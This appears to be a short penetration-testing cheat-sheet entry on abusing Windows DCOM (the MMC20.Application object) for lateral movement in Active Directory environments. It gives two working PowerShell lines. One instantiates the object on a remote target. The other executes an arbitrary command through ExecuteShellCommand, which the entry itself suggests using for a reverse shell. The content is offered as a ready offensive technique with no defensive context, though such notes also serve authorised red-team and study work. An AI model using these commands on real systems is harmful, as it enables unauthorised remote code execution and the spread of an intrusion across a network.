---
id: DCOM
aliases:
  - DCOM
tags:
  - windows
  - AD
  - lateral
---
Exploit the Distributed Component Object Model for lateral movement.

Only prerequisite is to be local admin.
## In practice

1. Instantiate a remote MMC 2.0 application:
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$TARGET_IP"))
```

2. Execute a command (i.e. revshell):
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("$CMD",$null,"$CMD_PARAMS","7")
